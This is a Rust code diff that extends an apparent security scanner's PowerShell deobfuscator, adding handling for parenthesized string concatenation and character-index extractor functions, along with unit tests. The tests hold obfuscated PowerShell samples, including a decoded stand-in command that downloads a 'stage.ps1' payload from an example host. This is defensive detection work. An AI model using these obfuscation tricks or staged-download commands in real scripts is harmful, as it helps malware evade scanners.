@@ -695,6 +695,33 @@ fn expand_string_concat(text: &str) -> String {
 }
 
 #[allow(clippy::expect_used)]
+static PAREN_STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?:\(\s*'(?:[^'\\]|\\.)*'\s*\)\s*\+\s*)+\(\s*'(?:[^'\\]|\\.)*'\s*\)"#)
+        .expect("parenthesized str concat regex")
+});
+
+fn expand_parenthesized_string_concat(text: &str) -> String {
+    let matches: Vec<(usize, usize, String)> = PAREN_STR_CONCAT_RE
+        .find_iter(text)
+        .filter_map(|m| {
+            if !is_string_concat_start(text, m.start()) {
+                return None;
+            }
+            let mut combined = String::new();
+            for cap in STR_PART_RE.captures_iter(m.as_str()) {
+                combined.push_str(cap.get(1)?.as_str());
+            }
+            Some((m.start(), m.end(), format!("'{}'", combined)))
+        })
+        .collect();
+    let mut result = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        result.replace_range(start..end, &replacement);
+    }
+    result
+}
+
+#[allow(clippy::expect_used)]
 static DQ_STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?:\"(?:[^\"\\]|\\.)*\"\s*\+\s*)+\"(?:[^\"\\]|\\.)*\""#)
         .expect("double quoted str concat regex")
@@ -985,6 +1012,14 @@ static PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Substring\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
     )
     .expect("ps literal substring extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
+static PS_LITERAL_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
+    )
+    .expect("ps literal index extractor body regex")
 });
 
 #[allow(clippy::expect_used)]
@@ -3365,6 +3400,43 @@ fn expand_literal_substring_extractor_calls(text: &str) -> String {
     out
 }
 
+fn expand_literal_index_extractor_calls(text: &str) -> String {
+    let lower = text.to_ascii_lowercase();
+    if !has_literal_extractor_def_signal(&lower) || !text.contains('[') || !text.contains('\'') {
+        return text.to_string();
+    }
+
+    let mut out = text.to_string();
+    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
+        let Some(caps) = PS_LITERAL_INDEX_EXTRACTOR_BODY_RE.captures(&body) else {
+            continue;
+        };
+        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(index_var) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+
+        let param_index = parse_ps_function_param_indices(&params);
+        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(index_idx) = param_index.get(&index_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+
+        let binding = PsIndexExtractorParamBinding {
+            value_idx,
+            value_name: value_var,
+            index_idx,
+            index_name: index_var,
+        };
+        out = inline_ps_literal_index_calls(&out, &name, binding);
+    }
+    out
+}
+
 fn expand_literal_replace_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !has_literal_extractor_def_signal(&lower)
@@ -3888,6 +3960,135 @@ fn inline_ps_named_literal_substring_call(
     Some((
         call_end,
         format!("'{}'", value[start..end].replace('\'', "''")),
+    ))
+}
+
+fn inline_ps_literal_index_calls(
+    text: &str,
+    name: &str,
+    binding: PsIndexExtractorParamBinding<'_>,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut match_count = 0;
+
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) = inline_ps_named_literal_index_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    binding.value_name,
+                    binding.index_name,
+                ) {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((first_end, first)) = parse_ps_literal_or_usize_arg(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+            let Some((second_end, second)) = parse_ps_literal_or_usize_arg(text, pos) else {
+                search_from = first_end;
+                continue;
+            };
+            let mut call_end = second_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = second_end;
+                    continue;
+                }
+                call_end = after + 1;
+            }
+
+            let args = [first, second];
+            let Some(value) = args
+                .get(binding.value_idx)
+                .and_then(PsLiteralOrUsizeArg::as_str)
+            else {
+                search_from = call_end;
+                continue;
+            };
+            let Some(index) = args
+                .get(binding.index_idx)
+                .and_then(PsLiteralOrUsizeArg::as_usize)
+            else {
+                search_from = call_end;
+                continue;
+            };
+            let Some(ch) = value.chars().nth(index) else {
+                search_from = call_end;
+                continue;
+            };
+            let replacement = format!("'{}'", ch.to_string().replace('\'', "''"));
+            matches.push((replace_start, call_end, replacement));
+            search_from = call_end;
+            match_count += 1;
+        }
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+#[derive(Clone, Copy)]
+struct PsIndexExtractorParamBinding<'a> {
+    value_idx: usize,
+    value_name: &'a str,
+    index_idx: usize,
+    index_name: &'a str,
+}
+
+fn inline_ps_named_literal_index_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    value_name: &str,
+    index_name: &str,
+) -> Option<(usize, String)> {
+    let (call_end, args) =
+        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 4)?;
+    let value = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
+        .1
+        .as_literal()?;
+    let index = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(index_name))?
+        .1
+        .as_usize()?;
+    let ch = value.chars().nth(index)?;
+    Some((
+        call_end,
+        format!("'{}'", ch.to_string().replace('\'', "''")),
     ))
 }
 
@@ -4999,6 +5200,9 @@ fn expand_obfuscation(text: &str) -> String {
                 out = expand_ps_dot_substring(&out);
                 out = expand_literal_substring_extractor_calls(&out);
             }
+            if signals.literal_index_extractor {
+                out = expand_literal_index_extractor_calls(&out);
+            }
             if signals.split_index {
                 out = expand_literal_split_index_extractor_calls(&out);
             }
@@ -5038,6 +5242,7 @@ fn expand_obfuscation(text: &str) -> String {
             }
             if signals.single_quote_concat {
                 out = expand_string_concat(&out);
+                out = expand_parenthesized_string_concat(&out);
             }
             if signals.double_quote_concat {
                 out = expand_double_string_concat(&out);
@@ -5108,6 +5313,9 @@ fn expand_obfuscation(text: &str) -> String {
                 out = expand_ps_dot_substring(&out);
                 out = expand_literal_substring_extractor_calls(&out);
             }
+            if signals.literal_index_extractor {
+                out = expand_literal_index_extractor_calls(&out);
+            }
             if signals.split_index {
                 out = expand_literal_split_index_extractor_calls(&out);
             }
@@ -5160,6 +5368,7 @@ struct PsObfuscationSignals {
     dot_replace: bool,
     trim_extractor: bool,
     substring: bool,
+    literal_index_extractor: bool,
     split_index: bool,
     embedded_single_quote_assignment: bool,
     doubled_single_quote: bool,
@@ -5200,6 +5409,8 @@ impl PsObfuscationSignals {
         let dot_replace = lower.contains(".replace");
         let trim_extractor = has_function_def && lower.contains(".trim");
         let substring = lower.contains(".substring");
+        let literal_index_extractor =
+            has_function_def && lower.contains('[') && text.contains('\'');
         let split_index =
             has_function_def && has_split_index_extractor_signal(&lower) && text.contains('[');
         let embedded_single_quote_assignment = has_embedded_single_quote_assignment_signal(text);
@@ -5247,6 +5458,7 @@ impl PsObfuscationSignals {
             dot_replace,
             trim_extractor,
             substring,
+            literal_index_extractor,
             split_index,
             embedded_single_quote_assignment,
             doubled_single_quote,
@@ -5279,6 +5491,7 @@ impl PsObfuscationSignals {
             || self.dot_replace
             || self.trim_extractor
             || self.substring
+            || self.literal_index_extractor
             || self.split_index
             || self.embedded_single_quote_assignment
             || self.doubled_single_quote
@@ -7156,10 +7369,11 @@ fn line_has_powershell_payload_flag(line: &str) -> bool {
 #[cfg(test)]
 mod literal_substring_extractor_tests {
     use super::{
-        expand_doubled_quote_literals, expand_literal_replace_extractor_calls,
-        expand_literal_split_index_extractor_calls, expand_literal_substring_extractor_calls,
-        expand_literal_trim_extractor_calls, literal_substring_extractor_defs,
-        PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
+        expand_doubled_quote_literals, expand_literal_index_extractor_calls,
+        expand_literal_replace_extractor_calls, expand_literal_split_index_extractor_calls,
+        expand_literal_substring_extractor_calls, expand_literal_trim_extractor_calls,
+        expand_parenthesized_string_concat, literal_substring_extractor_defs,
+        PS_LITERAL_INDEX_EXTRACTOR_BODY_RE, PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
     };
 
     #[test]
@@ -7178,6 +7392,15 @@ mod literal_substring_extractor_tests {
         let out = super::expand_space_concat(text);
 
         assert_eq!(out, text);
+    }
+
+    #[test]
+    fn parenthesized_single_quote_concat_is_rewritten() {
+        let text = "$cmd = ('Inv') + ('oke') + ('-WebRequest')";
+
+        let out = expand_parenthesized_string_concat(text);
+
+        assert_eq!(out, "$cmd = 'Invoke-WebRequest'");
     }
 
     #[test]
@@ -7287,6 +7510,28 @@ Pick 'zz{decoded}yy' 2 {len}"#,
                 "'Invoke-WebRequest -Uri https://ps-paren-substring-extractor.example/stage.ps1'"
             ),
             "parenthesized-receiver substring extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_index_extractor_call_is_rewritten() {
+        let text = r#"function Pick($value,$index) {
+  return $value[$index]
+}
+Pick 'xI' 1"#;
+
+        let defs = literal_substring_extractor_defs(text);
+        assert_eq!(defs.len(), 1, "unexpected parsed definitions: {defs:?}");
+        assert!(
+            PS_LITERAL_INDEX_EXTRACTOR_BODY_RE.is_match(&defs[0].2),
+            "index extractor body was not recognized:\n{}",
+            defs[0].2
+        );
+        let out = expand_literal_index_extractor_calls(text);
+
+        assert!(
+            out.contains("'I'"),
+            "index extractor call was not rewritten:\n{out}"
         );
     }
 
